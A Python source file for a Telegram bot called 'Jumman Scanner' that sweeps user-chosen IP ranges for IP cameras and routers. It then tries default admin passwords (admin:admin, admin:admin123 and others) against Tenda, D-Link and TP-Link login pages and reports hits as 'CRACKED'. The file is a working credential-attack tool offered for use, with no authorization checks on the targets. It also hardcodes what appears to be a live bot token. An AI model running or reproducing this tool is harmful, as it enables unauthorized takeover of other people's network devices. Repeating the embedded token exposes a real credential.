#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Jumman Scanner - Telegram Bot
IP Camera & Router Scanner with 6-Digit Access Key
Owner: Jumman
Version: 3.1 - Fixed
"""

import os
import sys
import time
import json
import hashlib
import socket
import ipaddress
import subprocess
import platform
import re
import threading
import queue
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

# ============ INSTALL DEPENDENCIES ============
def install_dependencies():
    try:
        import telegram
        print("[✓] python-telegram-bot already installed")
    except ImportError:
        print("[*] Installing python-telegram-bot...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "python-telegram-bot==13.7"])
        print("[✓] python-telegram-bot installed")
    
    try:
        import requests
        print("[✓] requests already installed")
    except ImportError:
        print("[*] Installing requests...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
        print("[✓] requests installed")

install_dependencies()

# ============ IMPORTS ============
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, MessageHandler, Filters, CallbackContext
import requests

# ============ CONFIGURATION ============
BOT_TOKEN = "8818530631:AAEEBZA59IFgVOAxP819XcQAge2Y-tfCZ5Y"
ADMIN_IDS = [6501841918]  # Replace with your Telegram user ID

KEY_FILE = "access.key"
CONFIG_FILE = "config.json"

# ============ ACCESS KEY SYSTEM ============
class AccessKeySystem:
    def __init__(self):
        self.key_file = KEY_FILE
        self.config_file = CONFIG_FILE
        self.load_config()
    
    def load_config(self):
        try:
            if os.path.exists(self.config_file):
                with open(self.config_file, 'r') as f:
                    self.config = json.load(f)
            else:
                self.config = {'first_run': True}
        except:
            self.config = {'first_run': True}
    
    def save_config(self):
        try:
            with open(self.config_file, 'w') as f:
                json.dump(self.config, f)
        except:
            pass
    
    def generate_key_hash(self, key):
        return hashlib.sha256(key.encode()).hexdigest()
    
    def is_first_run(self):
        return self.config.get('first_run', True)
    
    def set_first_run_done(self):
        self.config['first_run'] = False
        self.save_config()
    
    def save_key(self, key):
        try:
            key_hash = self.generate_key_hash(key)
            with open(self.key_file, 'w') as f:
                f.write(key_hash)
            return True
        except:
            return False
    
    def verify_key(self, key):
        try:
            if not os.path.exists(self.key_file):
                return False
            with open(self.key_file, 'r') as f:
                stored_hash = f.read().strip()
            key_hash = self.generate_key_hash(key)
            return key_hash == stored_hash
        except:
            return False
    
    def reset_key(self):
        if os.path.exists(self.key_file):
            os.remove(self.key_file)
        if os.path.exists(self.config_file):
            os.remove(self.config_file)
        return True


# ============ SCANNER FUNCTIONS ============
class JummanScanner:
    def __init__(self):
        self.results = {}
        self.cameras = []
        self.routers = []
        self.cracked = []
        self.scanning = False
        
    def validate_ip(self, ip_str):
        try:
            ipaddress.IPv4Address(ip_str)
            return True
        except:
            return False
    
    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except:
            return None
    
    def extract_title(self, html_content):
        try:
            match = re.search(r'<title[^>]*>(.*?)</title>', html_content, re.IGNORECASE | re.DOTALL)
            if match:
                return match.group(1).strip()
            return "No Title"
        except:
            return "No Title"
    
    def scan_ip(self, ip):
        """Scan single IP for camera or router"""
        results = []
        ports = [80, 8080, 443, 8081, 554]
        
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                result = sock.connect_ex((ip, port))
                sock.close()
                
                if result == 0:
                    try:
                        protocol = 'https' if port == 443 else 'http'
                        url = f"{protocol}://{ip}:{port}"
                        response = requests.get(url, timeout=2, verify=False, allow_redirects=True)
                        
                        if response.status_code in [200, 401, 403]:
                            content = response.text.lower()
                            title = self.extract_title(response.text)
                            
                            # Camera detection
                            camera_keywords = ['camera', 'cam', 'ipcam', 'web service', 'dvr', 
                                             'hikvision', 'dahua', 'login.asp', 'web']
                            is_camera = any(kw in content for kw in camera_keywords)
                            
                            # Router detection
                            router_keywords = ['tenda', 'd-link', 'dlink', 'tp-link', 'tplink', 
                                             'router', 'admin', 'login', 'gateway']
                            is_router = any(kw in content for kw in router_keywords)
                            
                            if is_camera:
                                results.append({
                                    'ip': ip,
                                    'port': port,
                                    'type': 'Camera',
                                    'title': title,
                                    'url': url
                                })
                            elif is_router:
                                brand = 'unknown'
                                for b in ['tenda', 'dlink', 'tplink']:
                                    if b in content:
                                        brand = b
                                        break
                                
                                credentials = self.test_credentials(url, brand)
                                
                                results.append({
                                    'ip': ip,
                                    'port': port,
                                    'type': 'Router',
                                    'brand': brand,
                                    'url': url,
                                    'credentials': credentials
                                })
                    except:
                        pass
            except:
                pass
        
        return results
    
    def test_credentials(self, url, brand):
        """Test 4 passwords on router"""
        credentials = [
            ('admin', 'admin'),
            ('admin', 'admin1'),
            ('admin', 'admin2'),
            ('admin', 'admin123')
        ]
        
        found = []
        login_paths = ['/', '/login', '/login.html', '/admin', '/cgi-bin/login']
        
        for username, password in credentials:
            for path in login_paths:
                try:
                    test_url = url + path
                    form_data = {
                        'username': username,
                        'password': password,
                        'user': username,
                        'pass': password,
                        'usr': username,
                        'pwd': password,
                    }
                    response = requests.post(test_url, data=form_data, timeout=2, 
                                            allow_redirects=True, verify=False)
                    
                    if response.status_code == 200:
                        content = response.text.lower()
                        if 'invalid' not in content and 'incorrect' not in content:
                            found.append({
                                'username': username,
                                'password': password,
                                'url': test_url
                            })
                            return found
                except:
                    pass
        
        return found
    
    def scan_range(self, start_ip, end_ip):
        """Scan IP range"""
        results = []
        try:
            start = int(ipaddress.IPv4Address(start_ip))
            end = int(ipaddress.IPv4Address(end_ip))
            
            if start > end:
                return {'error': 'Start IP must be less than End IP'}
            
            ip_list = []
            for ip_int in range(start, end + 1):
                if ip_int - start > 254:
                    break
                ip_list.append(str(ipaddress.IPv4Address(ip_int)))
            
            with ThreadPoolExecutor(max_workers=50) as executor:
                future_results = executor.map(self.scan_ip, ip_list)
                for result in future_results:
                    if result:
                        results.extend(result)
            
            return results
        except Exception as e:
            return {'error': str(e)}


# ============ TELEGRAM BOT ============
class JummanBot:
    def __init__(self, token):
        self.token = token
        self.scanner = JummanScanner()
        self.key_system = AccessKeySystem()
        self.user_states = {}
        self.scan_results = {}
        self.updater = None
        
    def start(self, update, context):
        """Start command handler"""
        user_id = update.effective_user.id
        
        if user_id not in ADMIN_IDS:
            update.message.reply_text(
                "🚫 *Access Denied!*\n\n"
                "You are not authorized to use this bot.\n"
                "Contact the administrator for access.",
                parse_mode='Markdown'
            )
            return
        
        keyboard = [
            [InlineKeyboardButton("⚡ Quick Scan", callback_data='quick_scan')],
            [InlineKeyboardButton("🔍 IP Range Scan", callback_data='range_scan')],
            [InlineKeyboardButton("📷 Camera Scanner", callback_data='camera_scan')],
            [InlineKeyboardButton("🌐 Router Scanner", callback_data='router_scan')],
            [InlineKeyboardButton("🔐 Admin Panel", callback_data='admin_panel')],
            [InlineKeyboardButton("ℹ️ Help", callback_data='help')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        welcome_msg = (
            "🤖 *Jumman Scanner Bot*\n\n"
            "🔥 *Features:*\n"
            "• 📷 IP Camera Detection\n"
            "• 🌐 Router Detection (Tenda, D-Link, TP-Link)\n"
            "• 💀 4 Password Testing\n"
            "• ⚡ Super Fast Scanning\n"
            "• 🔐 Secure Access System\n\n"
            "👑 *Owner:* Jumman\n"
            "📱 *Version:* 3.1\n\n"
            "Select an option below to get started!"
        )
        
        update.message.reply_text(
            welcome_msg,
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    def button_callback(self, update, context):
        """Handle button callbacks"""
        query = update.callback_query
        query.answer()
        
        user_id = update.effective_user.id
        
        if user_id not in ADMIN_IDS:
            query.edit_message_text("🚫 Access Denied!")
            return
        
        data = query.data
        
        if data == 'quick_scan':
            self.quick_scan(update, context)
        elif data == 'range_scan':
            self.range_scan_prompt(update, context)
        elif data == 'camera_scan':
            self.camera_scan(update, context)
        elif data == 'router_scan':
            self.router_scan(update, context)
        elif data == 'admin_panel':
            self.admin_panel(update, context)
        elif data == 'help':
            self.help(update, context)
        elif data == 'main_menu':
            self.start(update, context)
        elif data == 'reset_key':
            self.reset_key(update, context)
        elif data == 'view_cameras':
            self.view_devices(update, context, 'Camera')
        elif data == 'view_routers':
            self.view_devices(update, context, 'Router')
        elif data == 'view_cracked':
            self.view_cracked(update, context)
    
    def quick_scan(self, update, context):
        """Quick scan local network"""
        query = update.callback_query
        
        local_ip = self.scanner.get_local_ip()
        if not local_ip:
            query.edit_message_text("❌ Could not detect local network!")
            return
        
        subnet = ".".join(local_ip.split(".")[:3])
        start_ip = f"{subnet}.1"
        end_ip = f"{subnet}.50"
        
        query.edit_message_text(
            f"⚡ *Quick Scan Started!*\n\n"
            f"📡 Scanning: {start_ip} - {end_ip}\n"
            f"⏳ Please wait...\n\n"
            f"_This may take 30-60 seconds_",
            parse_mode='Markdown'
        )
        
        context.bot_data['scanning'] = True
        results = self.scanner.scan_range(start_ip, end_ip)
        context.bot_data['scanning'] = False
        
        if isinstance(results, dict) and 'error' in results:
            query.edit_message_text(f"❌ Error: {results['error']}")
            return
        
        context.bot_data['last_results'] = results
        self.display_results(update, context, results, query.message)
    
    def range_scan_prompt(self, update, context):
        """Prompt for IP range"""
        query = update.callback_query
        query.edit_message_text(
            "🔍 *IP Range Scan*\n\n"
            "Send the IP range in this format:\n"
            "`192.168.1.1 192.168.1.255`\n\n"
            "Or use quick scan with local network: /quickscan",
            parse_mode='Markdown'
        )
        context.user_data['scan_type'] = 'range'
    
    def camera_scan(self, update, context):
        """Scan for cameras only"""
        query = update.callback_query
        query.edit_message_text(
            "📷 *Camera Scanner*\n\n"
            "Send the IP range to scan for cameras:\n"
            "`192.168.1.1 192.168.1.255`\n\n"
            "Or use: /quickscan for local network",
            parse_mode='Markdown'
        )
        context.user_data['scan_type'] = 'camera'
    
    def router_scan(self, update, context):
        """Scan for routers only"""
        query = update.callback_query
        query.edit_message_text(
            "🌐 *Router Scanner*\n\n"
            "Send the IP range to scan for routers:\n"
            "`192.168.1.1 192.168.1.255`\n\n"
            "Detected Brands: Tenda, D-Link, TP-Link",
            parse_mode='Markdown'
        )
        context.user_data['scan_type'] = 'router'
    
    def admin_panel(self, update, context):
        """Admin panel"""
        query = update.callback_query
        user_id = update.effective_user.id
        
        if user_id not in ADMIN_IDS:
            query.edit_message_text("🚫 Admin access required!")
            return
        
        keyboard = [
            [InlineKeyboardButton("🔄 Reset Access Key", callback_data='reset_key')],
            [InlineKeyboardButton("📊 System Status", callback_data='system_status')],
            [InlineKeyboardButton("🔙 Main Menu", callback_data='main_menu')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        query.edit_message_text(
            "🔐 *Admin Panel*\n\n"
            "Select an option:",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    def help(self, update, context):
        """Help command"""
        query = update.callback_query
        
        help_text = (
            "ℹ️ *Help Guide*\n\n"
            "🔍 *Commands:*\n"
            "/start - Show main menu\n"
            "/quickscan - Quick scan local network\n"
            "/setscan <start> <end> - Scan specific IP range\n"
            "/status - Check scan status\n"
            "/help - Show this help\n\n"
            "📷 *What can I find?*\n"
            "• IP Cameras (HIK Vision, Dahua, etc.)\n"
            "• Routers (Tenda, D-Link, TP-Link only)\n"
            "• Test 4 default passwords\n\n"
            "💀 *Passwords Tested:*\n"
            "• admin:admin\n"
            "• admin:admin1\n"
            "• admin:admin2\n"
            "• admin:admin123\n\n"
            "👑 *Owner:* Jumman"
        )
        
        keyboard = [[InlineKeyboardButton("🔙 Main Menu", callback_data='main_menu')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        query.edit_message_text(
            help_text,
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    def display_results(self, update, context, results, message=None):
        """Display scan results"""
        if not results:
            result_text = "❌ No devices found in the scanned range."
            if message:
                message.edit_text(result_text)
            else:
                update.message.reply_text(result_text)
            return
        
        cameras = [r for r in results if r['type'] == 'Camera']
        routers = [r for r in results if r['type'] == 'Router']
        cracked = [r for r in routers if r.get('credentials')]
        
        text = "🔍 *Scan Results*\n\n"
        text += f"📷 *Cameras Found:* {len(cameras)}\n"
        text += f"🌐 *Routers Found:* {len(routers)}\n"
        text += f"💀 *Cracked:* {len(cracked)}\n\n"
        
        if cameras:
            text += "*📷 Cameras:*\n"
            for cam in cameras[:5]:
                text += f"• {cam['ip']}:{cam['port']} - {cam['title'][:30]}\n"
            if len(cameras) > 5:
                text += f"_...and {len(cameras)-5} more_\n"
            text += "\n"
        
        if routers:
            text += "*🌐 Routers:*\n"
            for router in routers[:5]:
                text += f"• {router['ip']}:{router['port']} [{router['brand'].upper()}]\n"
                if router.get('credentials'):
                    cred = router['credentials'][0]
                    text += f"  ✅ CRACKED: `{cred['username']}:{cred['password']}`\n"
            if len(routers) > 5:
                text += f"_...and {len(routers)-5} more_\n"
            text += "\n"
        
        keyboard = []
        if cameras:
            keyboard.append([InlineKeyboardButton("📷 View All Cameras", 
                                                callback_data='view_cameras')])
        if routers:
            keyboard.append([InlineKeyboardButton("🌐 View All Routers", 
                                                callback_data='view_routers')])
        if cracked:
            keyboard.append([InlineKeyboardButton("💀 View Cracked", 
                                                callback_data='view_cracked')])
        keyboard.append([InlineKeyboardButton("🔄 Scan Again", callback_data='quick_scan')])
        keyboard.append([InlineKeyboardButton("🔙 Main Menu", callback_data='main_menu')])
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        context.bot_data['last_results'] = results
        
        if message:
            message.edit_text(text, reply_markup=reply_markup, parse_mode='Markdown')
        else:
            update.message.reply_text(text, reply_markup=reply_markup, parse_mode='Markdown')
    
    def view_devices(self, update, context, device_type):
        """View specific device type"""
        query = update.callback_query
        results = context.bot_data.get('last_results', [])
        
        devices = [r for r in results if r['type'] == device_type]
        
        if not devices:
            query.edit_message_text(f"❌ No {device_type}s found.")
            return
        
        text = f"📋 *{device_type}s Found ({len(devices)})*\n\n"
        
        for i, device in enumerate(devices, 1):
            text += f"*{i}.* {device['ip']}:{device['port']}\n"
            if device_type == 'Camera':
                text += f"   📷 Title: {device['title'][:40]}\n"
            elif device_type == 'Router':
                text += f"   🌐 Brand: {device['brand'].upper()}\n"
                if device.get('credentials'):
                    cred = device['credentials'][0]
                    text += f"   ✅ CRACKED: `{cred['username']}:{cred['password']}`\n"
            text += f"   🔗 URL: {device['url']}\n\n"
            
            if i >= 20:
                text += f"_...and {len(devices)-20} more_\n"
                break
        
        keyboard = [[InlineKeyboardButton("🔙 Back to Results", callback_data='quick_scan')],
                   [InlineKeyboardButton("🔙 Main Menu", callback_data='main_menu')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')
    
    def view_cracked(self, update, context):
        """View cracked devices"""
        query = update.callback_query
        results = context.bot_data.get('last_results', [])
        
        cracked = [r for r in results if r['type'] == 'Router' and r.get('credentials')]
        
        if not cracked:
            query.edit_message_text("❌ No cracked devices found.")
            return
        
        text = f"💀 *Cracked Devices ({len(cracked)})*\n\n"
        
        for i, device in enumerate(cracked, 1):
            cred = device['credentials'][0]
            text += f"*{i}.* {device['ip']}:{device['port']} [{device['brand'].upper()}]\n"
            text += f"   👤 `{cred['username']}:{cred['password']}`\n"
            text += f"   🔗 {device['url']}\n\n"
            
            if i >= 20:
                text += f"_...and {len(cracked)-20} more_\n"
                break
        
        keyboard = [[InlineKeyboardButton("🔙 Back to Results", callback_data='quick_scan')],
                   [InlineKeyboardButton("🔙 Main Menu", callback_data='main_menu')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')
    
    def reset_key(self, update, context):
        """Reset access key"""
        query = update.callback_query
        user_id = update.effective_user.id
        
        if user_id not in ADMIN_IDS:
            query.edit_message_text("🚫 Admin access required!")
            return
        
        if self.key_system.reset_key():
            query.edit_message_text(
                "✅ Access key reset successfully!\n"
                "New key can be set with: /setkey <6-digit-key>"
            )
        else:
            query.edit_message_text("❌ Failed to reset key!")
    
    def handle_message(self, update, context):
        """Handle text messages"""
        user_id = update.effective_user.id
        
        if user_id not in ADMIN_IDS:
            update.message.reply_text("🚫 Access Denied!")
            return
        
        text = update.message.text
        
        if text.startswith('/setkey'):
            try:
                key = text.split()[1]
                if key.isdigit() and len(key) == 6:
                    if self.key_system.save_key(key):
                        update.message.reply_text(
                            "✅ Access key set successfully!\n"
                            "Use /start to continue."
                        )
                    else:
                        update.message.reply_text("❌ Failed to set key!")
                else:
                    update.message.reply_text(
                        "❌ Invalid key format!\n"
                        "Please provide exactly 6 digits."
                    )
            except:
                update.message.reply_text(
                    "❌ Usage: /setkey <6-digit-key>\n"
                    "Example: /setkey 123456"
                )
            return
        
        scan_type = context.user_data.get('scan_type')
        
        if scan_type in ['range', 'camera', 'router']:
            parts = text.split()
            if len(parts) >= 2:
                start_ip = parts[0]
                end_ip = parts[1]
                
                if self.scanner.validate_ip(start_ip) and self.scanner.validate_ip(end_ip):
                    update.message.reply_text(
                        f"🔍 *Scanning Started!*\n\n"
                        f"📡 Range: {start_ip} - {end_ip}\n"
                        f"⏳ Please wait...",
                        parse_mode='Markdown'
                    )
                    
                    results = self.scanner.scan_range(start_ip, end_ip)
                    
                    if isinstance(results, dict) and 'error' in results:
                        update.message.reply_text(f"❌ Error: {results['error']}")
                        return
                    
                    if scan_type == 'camera':
                        results = [r for r in results if r['type'] == 'Camera']
                    elif scan_type == 'router':
                        results = [r for r in results if r['type'] == 'Router']
                    
                    context.bot_data['last_results'] = results
                    self.display_results(update, context, results)
                    context.user_data['scan_type'] = None
                    return
            
            update.message.reply_text(
                "❌ Invalid IP format!\n"
                "Use: `192.168.1.1 192.168.1.255`",
                parse_mode='Markdown'
            )
            context.user_data['scan_type'] = None
    
    def quickscan_command(self, update, context):
        """Quick scan command"""
        user_id = update.effective_user.id
        
        if user_id not in ADMIN_IDS:
            update.message.reply_text("🚫 Access Denied!")
            return
        
        local_ip = self.scanner.get_local_ip()
        if not local_ip:
            update.message.reply_text("❌ Could not detect local network!")
            return
        
        subnet = ".".join(local_ip.split(".")[:3])
        start_ip = f"{subnet}.1"
        end_ip = f"{subnet}.50"
        
        update.message.reply_text(
            f"⚡ *Quick Scan Started!*\n\n"
            f"📡 Scanning: {start_ip} - {end_ip}\n"
            f"⏳ Please wait...",
            parse_mode='Markdown'
        )
        
        results = self.scanner.scan_range(start_ip, end_ip)
        context.bot_data['last_results'] = results
        self.display_results(update, context, results)
    
    def setscan_command(self, update, context):
        """Set custom scan range"""
        user_id = update.effective_user.id
        
        if user_id not in ADMIN_IDS:
            update.message.reply_text("🚫 Access Denied!")
            return
        
        try:
            start_ip = context.args[0]
            end_ip = context.args[1]
            
            if self.scanner.validate_ip(start_ip) and self.scanner.validate_ip(end_ip):
                update.message.reply_text(
                    f"🔍 *Scan Started!*\n\n"
                    f"📡 Range: {start_ip} - {end_ip}\n"
                    f"⏳ Please wait...",
                    parse_mode='Markdown'
                )
                
                results = self.scanner.scan_range(start_ip, end_ip)
                context.bot_data['last_results'] = results
                self.display_results(update, context, results)
            else:
                update.message.reply_text("❌ Invalid IP format!")
        except:
            update.message.reply_text(
                "❌ Usage: /setscan <start_ip> <end_ip>\n"
                "Example: /setscan 192.168.1.1 192.168.1.255"
            )
    
    def status_command(self, update, context):
        """Check scan status"""
        user_id = update.effective_user.id
        
        if user_id not in ADMIN_IDS:
            update.message.reply_text("🚫 Access Denied!")
            return
        
        is_scanning = context.bot_data.get('scanning', False)
        status_text = (
            "📊 *System Status*\n\n"
            f"Scanning: {'🟢 Active' if is_scanning else '🟠 Idle'}\n"
            f"Bot Status: 🟢 Online\n"
            f"Version: 3.1\n"
            f"Owner: Jumman\n\n"
            "⚡ *Commands Available:*\n"
            "/start - Main menu\n"
            "/quickscan - Quick scan\n"
            "/setscan - Custom scan\n"
            "/status - This menu"
        )
        update.message.reply_text(status_text, parse_mode='Markdown')
    
    def help_command(self, update, context):
        """Help command"""
        user_id = update.effective_user.id
        
        if user_id not in ADMIN_IDS:
            update.message.reply_text("🚫 Access Denied!")
            return
        
        help_text = (
            "ℹ️ *Jumman Scanner Bot - Help*\n\n"
            "🔍 *Commands:*\n"
            "/start - Show main menu\n"
            "/quickscan - Quick scan local network (50 IPs)\n"
            "/setscan <start> <end> - Scan specific IP range\n"
            "/status - Check system status\n"
            "/help - Show this help\n\n"
            "📷 *What can I find?*\n"
            "• IP Cameras (HIK Vision, Dahua, etc.)\n"
            "• Routers (Tenda, D-Link, TP-Link only)\n"
            "• Test 4 default passwords\n\n"
            "💀 *Passwords Tested:*\n"
            "• admin:admin\n"
            "• admin:admin1\n"
            "• admin:admin2\n"
            "• admin:admin123\n\n"
            "👑 *Owner:* Jumman"
        )
        
        update.message.reply_text(help_text, parse_mode='Markdown')
    
    def error_handler(self, update, context):
        """Handle errors"""
        print(f"[!] Error: {context.error}")
    
    def run(self):
        """Run the bot"""
        print("=" * 50)
        print("🤖 Jumman Scanner Bot")
        print(f"👑 Owner: Jumman")
        print(f"📱 Version: 3.1")
        print(f"🤖 Bot Token: {self.token[:15]}...")
        print("=" * 50)
        print("\n✅ Bot is starting...")
        print("📱 Send /start to your bot on Telegram")
        print("\n⚠️  Press Ctrl+C to stop the bot")
        print("=" * 50)
        
        # Create updater
        self.updater = Updater(self.token, use_context=True)
        dp = self.updater.dispatcher
        
        # Add handlers
        dp.add_handler(CommandHandler("start", self.start))
        dp.add_handler(CommandHandler("quickscan", self.quickscan_command))
        dp.add_handler(CommandHandler("setscan", self.setscan_command))
        dp.add_handler(CommandHandler("status", self.status_command))
        dp.add_handler(CommandHandler("help", self.help_command))
        dp.add_handler(CallbackQueryHandler(self.button_callback))
        dp.add_handler(MessageHandler(Filters.text & ~Filters.command, self.handle_message))
        
        # Error handler
        dp.add_error_handler(self.error_handler)
        
        # Start bot
        self.updater.start_polling()
        print("\n✅ Bot is running!\n")
        self.updater.idle()


# ============ MAIN ============
def main():
    """Main entry point"""
    try:
        bot = JummanBot(BOT_TOKEN)
        bot.run()
    except KeyboardInterrupt:
        print("\n\n[!] Bot stopped by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Fatal error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()